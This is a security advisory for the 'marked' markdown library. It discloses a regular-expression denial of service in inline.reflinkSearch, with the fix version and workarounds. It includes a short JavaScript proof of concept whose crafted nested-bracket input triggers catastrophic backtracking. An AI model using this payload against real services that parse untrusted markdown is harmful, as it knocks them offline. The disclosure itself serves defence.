Denial of service.

The regular expression `inline.reflinkSearch` may cause catastrophic backtracking against some strings.

PoC is the following.

```
import * as marked from 'marked';

console.log(marked.parse(`[x]: x

\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](`));
```

*Who is impacted?*

Anyone who runs untrusted markdown through marked and does not use a worker with a time limit.

### Patches

*Has the problem been patched?*

Yes

*What versions should users upgrade to?*

4.0.10

### Workarounds

*Is there a way for users to fix or remediate the vulnerability without upgrading?*

Do not run untrusted markdown through marked or run marked on a [worker](https://marked.js.org/using_advanced#workers) thread and set a reasonable time limit to prevent draining resources.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
